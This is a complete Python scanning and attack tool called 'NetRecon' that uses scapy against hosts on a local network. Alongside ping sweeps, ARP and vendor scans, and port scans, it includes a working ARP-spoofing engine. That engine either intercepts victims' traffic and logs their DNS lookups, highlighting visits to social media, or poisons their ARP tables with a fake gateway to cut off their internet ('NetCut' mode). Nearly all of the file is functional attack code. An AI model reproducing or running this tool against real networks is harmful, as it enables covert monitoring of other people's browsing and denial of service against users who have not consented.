import ipaddress
import os
import platform
import socket
import subprocess
import sys
import threading
import time
from concurrent.futures import ThreadPoolExecutor
from scapy.all import ARP, DNS, DNSQR, IP, UDP, Ether, send, sendp, sniff, srp

# =================================================================
#                     HELPER FUNCTIONS
# =================================================================


def check_root():
  if os.geteuid() != 0:
    print(
        "[-] Error: NetRecon must be run with root privileges (sudo python3"
        " netrecon.py)."
    )
    sys.exit(1)


def get_local_ip_and_subnet():
  try:
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("8.8.8.8", 80))
    local_ip = s.getsockname()[0]
    s.close()
    parts = local_ip.split(".")
    subnet = f"{parts[0]}.{parts[1]}.{parts[2]}.0/24"
    return local_ip, subnet
  except Exception:
    return "192.168.1.50", "192.168.1.0/24"


def get_gateway_ip(local_ip):
  parts = local_ip.split(".")
  return f"{parts[0]}.{parts[1]}.{parts[2]}.1"


def get_mac(ip):
  try:
    ans, _ = srp(
        Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip), timeout=0.5, verbose=False
    )
    for _, rcv in ans:
      return rcv[Ether].src
  except Exception:
    return None


def get_device_vendor(mac):
  if not mac or mac == "N/A":
    return "Unknown Vendor"
  try:
    from scapy.data import MANUFDB

    oui = ":".join(mac.split(":")[:3]).upper()
    return MANUFDB._manufdb.get(oui, "Generic / Unknown Vendor")
  except Exception:
    return "Unknown Vendor"


def get_hostname(ip):
  try:
    hostname, _, _ = socket.gethostbyaddr(ip)
    return hostname
  except Exception:
    return "Unknown Hostname"


def enable_ip_forwarding():
  try:
    with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
      f.write("1")
  except Exception:
    pass


def disable_ip_forwarding():
  try:
    with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
      f.write("0")
  except Exception:
    pass


# =================================================================
#                     ARP SPOOFING & NETCUT ENGINE
# =================================================================


def arp_spoof(target_ips, gateway_ip, gateway_mac, stop_event, cut_internet=False, interface=None):
  targets_info = []
  for t_ip in target_ips:
    t_mac = get_mac(t_ip)
    if t_mac:
      targets_info.append({"ip": t_ip, "mac": t_mac})

  mode_str = "NETCUT (Internet Blocked)" if cut_internet else "MITM Sniffing"
  print(f"[*] ARP Engine Active [{mode_str}] for targets: {target_ips}")

  while not stop_event.is_set():
    for target in targets_info:
      fake_gateway_hw = "00:11:22:33:44:55" if cut_internet else gateway_mac
      
      # Scapy warning'ini önlemek için sendp ve Ether katmanı kullanıldı
      sendp(
          Ether(dst=target["mac"]) / ARP(
              op=2,
              pdst=target["ip"],
              hwdst=target["mac"],
              psrc=gateway_ip,
              hwsrc=fake_gateway_hw,
          ),
          iface=interface,
          verbose=False,
      )
      
      if not cut_internet and gateway_mac:
        sendp(
            Ether(dst=gateway_mac) / ARP(
                op=2,
                pdst=gateway_ip,
                hwdst=gateway_mac,
                psrc=target["ip"],
                hwsrc=target["mac"],
            ),
            iface=interface,
            verbose=False,
        )
    time.sleep(2)


def restore_network(target_ips, gateway_ip, interface=None):
  print("\n[*] Restoring network ARP tables for targets...")
  gateway_mac = get_mac(gateway_ip)
  for t_ip in target_ips:
    t_mac = get_mac(t_ip)
    if t_mac and gateway_mac:
      sendp(
          Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(
              op=2,
              pdst=t_ip,
              hwdst="ff:ff:ff:ff:ff:ff",
              psrc=gateway_ip,
              hwsrc=gateway_mac,
          ),
          iface=interface,
          count=3,
          verbose=False,
      )
      sendp(
          Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(
              op=2,
              pdst=gateway_ip,
              hwdst="ff:ff:ff:ff:ff:ff",
              psrc=t_ip,
              hwsrc=t_mac,
          ),
          iface=interface,
          count=3,
          verbose=False,
      )
  print("[+] Network fully restored.")


# =================================================================
#                    FAST HOST & PORT SCANNER
# =================================================================


def ping_host(ip):
  param = "-n" if platform.system().lower() == "windows" else "-c"
  command = ["ping", param, "1", "-W", "1", str(ip)]
  try:
    if (
        subprocess.run(
            command, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
        ).returncode
        == 0
    ):
      return str(ip)
  except Exception:
    pass
  return None


def scan_network_fast(subnet):
  print("\n[*] Running Fast IP Discovery (Pure Ping Sweep)...")
  try:
    net = ipaddress.ip_network(subnet, strict=False)
  except ValueError as e:
    print(f"[-] Invalid subnet: {e}")
    return []

  active_hosts = []
  with ThreadPoolExecutor(max_workers=100) as executor:
    results = executor.map(ping_host, net.hosts())
    for ip in results:
      if ip:
        active_hosts.append(ip)
  return sorted(active_hosts, key=lambda ip: ipaddress.ip_address(ip))


def scan_network_detailed(subnet):
  print("\n[*] Running Deep ARP & Vendor Scan (Captures all MACs/Vendors)...")
  try:
    ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=subnet), timeout=2, verbose=False)
    active_hosts = []
    for _, rcv in ans:
      active_hosts.append(rcv[IP].src)
    return sorted(list(set(active_hosts)), key=lambda ip: ipaddress.ip_address(ip))
  except Exception as e:
    print(f"[-] Detailed scan error: {e}")
    return []


def scan_ports_for_targets(target_ips):
  common_ports = [21, 22, 23, 25, 53, 80, 110, 443, 445, 3306, 8080]
  for target_ip in target_ips:
    print(
        f"\n------------------------------------------------------------------"
    )
    print(f"[*] Quick Port Scan on Target: {target_ip}")
    
    def check_port(port):
      try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(0.4)
        result = s.connect_ex((target_ip, port))
        s.close()
        if result == 0:
          return port
      except Exception:
        pass
      return None

    with ThreadPoolExecutor(max_workers=10) as executor:
      results = executor.map(check_port, common_ports)
      open_ports = [p for p in results if p]

    if open_ports:
      for p in open_ports:
        print(f"    [+] Open Port Discovered: {p}")
    else:
      print("    [-] No common open ports found or firewall blocking.")
  print("------------------------------------------------------------------")


# =================================================================
#                     DNS PACKET HANDLER
# =================================================================


def dns_callback(packet):
  if packet.haslayer(DNS) and packet.haslayer(DNSQR):
    qname = packet[DNSQR].qname.decode("utf-8", errors="ignore").lower()
    src_ip = packet[IP].src if packet.haslayer(IP) else "Unknown"

    social_keywords = [
        "instagram",
        "cdninstagram",
        "fbcdn",
        "facebook",
        "twitter",
        "tiktok",
        "whatsapp",
    ]
    is_social = any(keyword in qname for keyword in social_keywords)

    if is_social:
      print(
          f"\033[91m[SOCIAL MEDIA ALERT] Source: {src_ip} ---> Requested"
          f" Domain: {qname}\033[0m"
      )
    else:
      print(f"[DNS QUERY] Source: {src_ip} ---> Requested Domain: {qname}")


# =================================================================
#                            MAIN FLOW
# =================================================================


def main():
  check_root()

  print(
      "================================================================="
  )
  print("                    NetRecon v4.4 (Optimized)                    ")
  print("     Ultimate Network Recon, NetCut & Social Monitor             ")
  print(
      "================================================================="
  )

  interface = input(
      "[*] Enter interface name to use (e.g., wlan0, eth0) or press enter for"
      " default: "
  ).strip()
  if not interface:
    interface = None

  auto_ip, auto_subnet = get_local_ip_and_subnet()

  print("\n------------------------------------------------------------------")
  print("SUBNET SELECTION:")
  print(f"1. Auto-detect (Recommended: {auto_subnet})")
  print("2. Enter manual subnet (e.g., 192.168.2.0/24)")
  print("------------------------------------------------------------------")

  subnet_choice = input("[*] Enter choice (1 or 2): ").strip()
  if subnet_choice == "2":
    subnet_input = input(
        "[*] Enter target subnet (e.g., 192.168.1.0/24): "
    ).strip()
  else:
    subnet_input = auto_subnet
    print(f"[*] Auto-selected subnet: {subnet_input}")

  print("\n------------------------------------------------------------------")
  print("SCAN MODE SELECTION:")
  print("1. Fast IP Scan (Lightning fast ping sweep - ONLY IPs)")
  print("2. Detailed ARP & Vendor Scan (Captures all MACs & Vendors)")
  print("------------------------------------------------------------------")
  scan_mode = input("[*] Choose scan mode (1 or 2): ").strip()

  while True:
    if scan_mode == "2":
      active_hosts = scan_network_detailed(subnet_input)
    else:
      active_hosts = scan_network_fast(subnet_input)

    if not active_hosts:
      print("[-] No active hosts found on the network.")
      break

    print("\n------------------------------------------------------------------")
    print("DISCOVERED HOSTS ON NETWORK:")
    print("------------------------------------------------------------------")

    gateway_ip = get_gateway_ip(auto_ip)

    # Eğer hızlı tarama seçildiyse MAC/Vendor sorgulaması yapmadan anında sadece IP göster
    if scan_mode == "1":
      for idx, host in enumerate(active_hosts):
        gw_tag = " (GATEWAY)" if host == gateway_ip else ""
        print(f"    [{idx}] IP: {host}{gw_tag}")
    else:
      # Detaylı taramada zaten MAC'ler var, hemen yazdır
      def fetch_host_details(host):
        h_mac = get_mac(host)
        h_vendor = get_device_vendor(h_mac)
        h_name = get_hostname(host)
        return host, h_mac, h_vendor, h_name

      with ThreadPoolExecutor(max_workers=20) as executor:
        host_details = list(executor.map(fetch_host_details, active_hosts))

      for idx, (host, h_mac, h_vendor, h_name) in enumerate(host_details):
        gw_tag = " (GATEWAY)" if host == gateway_ip else ""
        print(
            f"    [{idx}] IP: {host}{gw_tag} | MAC: {h_mac} | Hostname: {h_name} |"
            f" Vendor: {h_vendor}"
        )

    print("\n[!] MULTI-TARGET SELECTION ADVICE:")
    print("    You can select multiple targets by entering indexes separated by commas.")
    print("    Example: 0,2,5  (Avoid selecting the Gateway unless testing)")
    
    try:
      choices_input = input("\n[*] Enter target index(es) to select: ").strip()
      indexes = [int(i.strip()) for i in choices_input.split(",")]
      target_ips = [active_hosts[i] for i in indexes]
    except (ValueError, IndexError):
      print("[-] Invalid selection format. Returning to menu...")
      continue

    while True:
      print(
          "\n================================================================="
      )
      print(f"SELECTED TARGETS: {target_ips}")
      print(
          "================================================================="
      )
      print("1. Run Quick Port Scan on Selected Target(s)")
      print("2. Start DNS Sniffing & MITM (Target Specific / ARP Spoofing)")
      print("3. NetCut Mode (Block Internet Access for Selected Target(s))")
      print("4. Rescan Network / Change Targets")
      print("------------------------------------------------------------------")

      action = input("[*] Choose an action (1-4): ").strip()

      if action == "1":
        scan_ports_for_targets(target_ips)
        input("\n[*] Press Enter to return to target menu...")

      elif action == "2" or action == "3":
        gateway_mac = get_mac(gateway_ip)
        if not gateway_mac:
          print("[-] Error: Could not resolve Gateway MAC address. Try again.")
          continue

        cut_mode = True if action == "3" else False
        if cut_mode:
          print("[!] NETCUT ACTIVE: Blocking internet access for selected targets...")
          disable_ip_forwarding()
        else:
          print("[*] Universal DNS Sniffing & MITM active...")
          enable_ip_forwarding()

        stop_event = threading.Event()
        spoof_thread = threading.Thread(
            target=arp_spoof,
            args=(target_ips, gateway_ip, gateway_mac, stop_event, cut_mode, interface),
        )
        spoof_thread.daemon = True
        spoof_thread.start()

        if not cut_mode:
          print(
              "\n================================================================="
          )
          print(
              f"[*] Listening on interface: {interface if interface else 'default'}"
          )
          print(
              "[*] MITM DNS SNIFFING ACTIVE (Social Media & Traffic Interception)"
          )
          print(
              "================================================================="
          )

          try:
            sniff(
                iface=interface,
                filter="udp port 53",
                prn=dns_callback,
                store=0,
            )
          except KeyboardInterrupt:
            print("\n[*] Stopping sniffer by user...")
        else:
          print("\n[+] NetCut is running. Press Ctrl+C to stop and restore network.")
          try:
            while True:
              time.sleep(1)
          except KeyboardInterrupt:
            pass

        stop_event.set()
        spoof_thread.join()
        restore_network(target_ips, gateway_ip, interface)
        
        disable_ip_forwarding()
        print("[+] Network restored completely.")
        input("\n[*] Press Enter to return to target menu...")

      elif action == "4":
        break
      else:
        print("[-] Invalid option. Please choose between 1-4.")


if __name__ == "__main__":
  try:
    main()
  except KeyboardInterrupt:
    print("\n[+] Program closed completely by user.")
    sys.exit(0)
